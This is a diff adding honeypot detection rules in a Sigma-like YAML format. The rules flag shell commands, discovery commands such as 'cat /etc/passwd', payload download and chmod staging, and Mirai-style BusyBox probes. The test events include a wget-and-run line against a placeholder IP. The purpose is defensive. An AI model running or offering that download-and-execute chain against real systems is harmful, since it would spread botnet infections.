@@ -1,0 +1,87 @@
+name: shell-command
+id: 83f3998c-4fc7-4d9c-8b18-428e56b882e8
+title: Interactive shell command
+status: stable
+version: 1
+level: medium
+confidence: 0.85
+detection_type: COMMAND_INTERACTION
+description: A command was entered in the emulated SSH/Telnet shell.
+tags: [attack.execution, attack.t1059.004]
+detection:
+  selection:
+    process.command_line|exists: true
+  condition: selection
+tests:
+  - match: true
+    events: [{event: {category: process}, process: {command_line: "uname -a"}}]
+  - match: false
+    events: [{event: {category: session}}]
+---
+name: system-discovery-commands
+id: 7a897f9a-48e3-4a5d-bd3c-f41d4d94491c
+title: Host and user discovery commands
+status: stable
+version: 1
+level: medium
+confidence: 0.8
+detection_type: COMMAND_INTERACTION
+description: Fingerprinting commands typical of post-login triage on embedded Linux.
+tags: [attack.discovery, attack.t1082, attack.t1033]
+detection:
+  selection:
+    process.command_line|re: '^\s*(uname|id|whoami|hostname|cat\s+/proc/(cpuinfo|version|meminfo)|cat\s+/etc/(os-release|issue|passwd)|nproc|free|lscpu)\b'
+  condition: selection
+tests:
+  - match: true
+    events: [{process: {command_line: "cat /proc/cpuinfo"}}]
+  - match: false
+    events: [{process: {command_line: "ls"}}]
+---
+name: payload-download-command
+id: 9232a017-a366-435b-b38c-badf2b11b5d2
+title: Payload download or staging command
+status: stable
+version: 1
+level: high
+confidence: 0.9
+detection_type: MALWARE_DOWNLOAD
+description: >
+  wget/curl/tftp/ftpget fetches or chmod staging in writable directories, the
+  canonical IoT botnet infection chain. The emulated shell never executes it.
+tags: [attack.command-and-control, attack.t1105, attack.execution, attack.t1059.004]
+detection:
+  fetch:
+    process.command_line|re: '\b(wget|curl|tftp|ftpget)\b'
+  staging:
+    process.command_line|re: 'chmod\s+(\+x|[0-7]{3,4})\s+\S*(/tmp/|/var/run/|/dev/shm/)'
+  condition: fetch or staging
+tests:
+  - match: true
+    events: [{process: {command_line: "cd /tmp; wget http://198.51.100.7/x.sh; sh x.sh"}}]
+  - match: true
+    events: [{process: {command_line: "chmod 777 /tmp/.x"}}]
+  - match: false
+    events: [{process: {command_line: "uname -a"}}]
+---
+name: busybox-applet-check
+id: 699dce69-3682-4c4c-9a39-8ebe6faaea35
+title: Botnet-style BusyBox applet probe
+status: test
+version: 1
+level: high
+confidence: 0.85
+detection_type: COMMAND_INTERACTION
+description: >
+  Mirai-family loaders run `/bin/busybox <RANDOMTAG>` to confirm a real BusyBox
+  shell before infecting. Humans essentially never type this.
+tags: [attack.execution, attack.t1059.004, attack.discovery, attack.t1082]
+detection:
+  selection:
+    process.command_line|re|cased: '(/bin/)?busybox\s+[A-Z]{4,}'
+  condition: selection
+tests:
+  - match: true
+    events: [{process: {command_line: "/bin/busybox ECCHI"}}]
+  - match: false
+    events: [{process: {command_line: "busybox ls"}}]
